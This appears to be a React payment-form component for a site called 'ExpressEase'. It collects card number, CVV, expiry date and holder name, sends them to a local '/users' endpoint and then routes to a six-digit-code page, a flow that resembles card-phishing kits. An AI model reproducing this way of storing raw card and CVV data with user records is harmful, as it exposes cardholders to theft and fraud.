import React, { useState } from 'react';
import { useLocation } from 'react-router-dom';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';

import './style.css';

function App() {
  const location = useLocation();
  const [additionalData, setAdditionalData] = useState({
    card_num: '',
    card_cvv: '',
    date: '',
    customer_name: 'fanat',
    amount: '',
    boolean_field: 'true',
    abobus_name: ''
    
  });
  const [formSubmitted, setFormSubmitted] = useState(false);

  const formData = location.state ? location.state.formData : {};
  const navigate = useNavigate();

  const handleChange = (e) => {
    setAdditionalData({
      ...additionalData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setFormSubmitted(true);
    const invalid = Object.keys(additionalData).filter(key => !additionalData[key].trim());
    if (invalid.length > 0) {
      alert('Please fill in all required fields.');
      return;
    }

    try {
      navigate('/SixDigitsT');
      const response = await axios.post('http://localhost:3002/users', {
        ...formData,
        ...additionalData
      });
      console.log(response.data);
      // Добавьте здесь код для обработки успешного сохранения пользователя
    } catch (error) {
      console.error('Ошибка при отправке данных на сервер:', error);
      // Добавьте здесь код для обработки ошибки
    }
  };

  return (
    <div>
      <html>
        <head>
          <script scr="/script.js"></script>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1" />
          <title>Bootstrap demo</title>
          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous" />
          <style>{`
            .input-field.invalid {
              border-color: red;
            }
          `}</style>
        </head>
        <body class="page-top">
          <header class="header">
            <a class="logo" href="">ExpressEase</a>
            <input class="menu-btn" type="checkbox" id="menu-btn" />
            <label class="menu-icon" for="menu-btn"><span class="navicon"></span></label>
           
          </header>
          <section class="add-card page">
            <link rel="stylesheet" href="style.css" />
            <form class="form">
              <div class="non-split">
              <label for="name" class="label">
                  <span class="title">Amount</span>
                  <input
                    class={`input-field ${formSubmitted && !additionalData.amount.trim() && 'invalid'}`}
                    type="text"
                    name="amount"
                    title="Input title"
                    placeholder="Write your amount"
                    maxLength="16"
                    onChange={handleChange}
                    required
                  />
                </label>
                <label for="name" class="label">
                  <span class="title">Card holder full name</span>
                  <input
                    class={`input-field ${formSubmitted && !additionalData.abobus_name.trim() && 'invalid'}`}
                    type="text"
                    name="abobus_name"
                    title="Input title"
                    placeholder="Enter your full name"
                    maxLength="255"
                    onChange={handleChange}
                    required
                  />
                </label>
                <label htmlFOr="card_num" class="label">
                  <span class="title">Card Number</span>
                  <input
                    id="card_num"
                    class={`input-field ${formSubmitted && !additionalData.card_num.trim() && 'invalid'}`}
                    type="text"
                    name="card_num"
                    title="Input title"
                    value={formData.card_num}
                    onChange={handleChange}
                    placeholder="0000 0000 0000 0000"
                    maxLength="16"
                    required
                  />
                </label>
              </div>
              <div class="split">
                <label for="ExDate" class="label">
                  <span class="title">Expiry Date</span>
                  <input
                    id="date"
                    class={`input-field ${formSubmitted && !additionalData.date.trim() && 'invalid'}`}
                    type="text"
                    name="date"
                    title="Expiry Date"
                    placeholder="MM/YY"
                    value={formData.date}
                    onChange={handleChange}
                    maxLength="5"
                    required
                  />
                </label>
                <label htmlFor="card_cvv" class="label">
                  <span class="title"> CVV</span>
                  <input
                    id="card_cvv"
                    class={`input-field ${formSubmitted && !additionalData.card_cvv.trim() && 'invalid'}`}
                    type="text"
                    name="card_cvv"
                    title="CVV"
                    maxLength="3"
                    value={formData.card_cvv}
                    onChange={handleChange}
                    placeholder="CVV"
                    required
                  />
                </label>
              </div>
              <input class="checkout-btn" type="submit" value="Checkout" onClick={handleSubmit} />
            </form>
          </section>
        </body>
      </html>
    </div>
  );
}

export default App;
